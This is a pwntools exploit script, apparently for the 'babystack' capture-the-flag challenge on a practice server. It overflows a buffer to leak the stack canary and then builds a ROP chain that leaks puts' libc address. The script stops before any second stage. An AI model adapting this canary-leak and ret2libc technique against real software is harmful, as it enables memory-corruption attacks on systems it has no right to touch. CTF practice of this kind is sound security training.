from pwn import *

context(log_level='debug',os='linux',arch='amd64')

io=remote('node5.buuoj.cn',25548)
elf=ELF('/home/lixingjian/pwn/babystack')
libc=ELF('/home/lixingjian/libc/libc-2.23.so')

io.recvuntil(b">> ")

payload=b'1'+b'a'*(0x1E)
io.sendline(payload)

payload=b'a'*(0x88)
io.sendline(payload)

io.recvuntil(b">> ")

payload=b'2'+b'a'*(0x1E)
io.sendline(payload)

io.recvuntil(b'a\n')
canary=u64(io.recv(7).rjust(8,b'\x00'))

io.recvuntil(b">> ")

payload=b'1'+b'a'*(0x1E)
io.sendline(payload)

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x400a93
main_addr=0x400908
ret_addr=0x40067e
payload=b'a'*(0x88)+p64(canary)+b'a'*(0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.send(payload)



io.interactive()